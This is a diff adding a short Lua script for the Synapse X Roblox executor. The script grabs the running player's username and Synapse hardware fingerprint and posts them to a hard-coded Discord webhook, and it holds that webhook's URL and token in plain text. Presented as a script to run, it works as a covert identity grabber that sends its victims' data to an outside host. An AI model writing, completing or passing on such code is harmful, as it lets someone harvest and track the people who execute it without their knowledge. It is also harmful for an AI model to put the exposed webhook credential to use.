@@ -1,0 +1,23 @@
+local Webhook_URL = "https://discord.com/api/webhooks/1040402902814048326/OpsLc6oK7vA021_qUxx3yMNRngsNYFNG1khxasJsi4Wy-jaj5QpHCcSj5hcsJZyjSIWH"
+local Parsed = game:GetService("HttpService"):JSONDecode(syn.request({Url = "https://httpbin.org/get"}).Body)
+ 
+local data = {
+["embeds"] = {
+    ["content"] = "",
+        {
+            ["title"] = "**Successfully Aquired " .. game:GetService("Players").LocalPlayer.Name .. "'s Hardware ID: **",
+            ["description"] = "```" .. tostring(Parsed.headers["Syn-Fingerprint"]) .. "```",
+            ["type"] = "rich",
+            ["color"] = tonumber(0x0000),
+        }
+    }
+}
+
+local WebhookSend = {
+    Url = Webhook_URL,
+    Body = game:GetService("HttpService"):JSONEncode(data),
+    Method = "POST",
+    Headers = {["content-type"] = "application/json"}
+}
+
+syn.request(WebhookSend)
